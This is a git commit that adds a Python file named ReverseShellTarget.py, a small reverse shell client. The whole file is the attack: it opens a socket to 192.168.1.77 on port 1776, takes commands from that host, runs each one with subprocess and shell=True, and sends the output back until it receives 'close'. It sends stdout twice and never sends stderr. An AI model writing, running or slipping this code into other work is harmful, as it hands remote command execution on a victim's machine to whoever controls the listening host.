8f2dc52fe2581aee6fdb23e482a5c4a6fea4e367
toorealy <36117535+toorealy@users.noreply.github.com>
2019-10-29 09:48:13 -0500

    Add files via upload

---
+++ ReverseShellTarget.py
@@ -0,0 +1,21 @@
+import socket
+import subprocess
+
+def connect():
+    s= socket.socket()
+    s.connect(("192.168.1.77",1776))
+    while True:
+        command = s.recv(1024)
+        if 'close' in command.decode():
+            s.close()
+            break
+        else:
+            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+            s.send(CMD.stdout.read())
+            s.send(CMD.stdout.read())
+
+def main():
+    connect()
+
+if __name__== "__main__":
+   main()
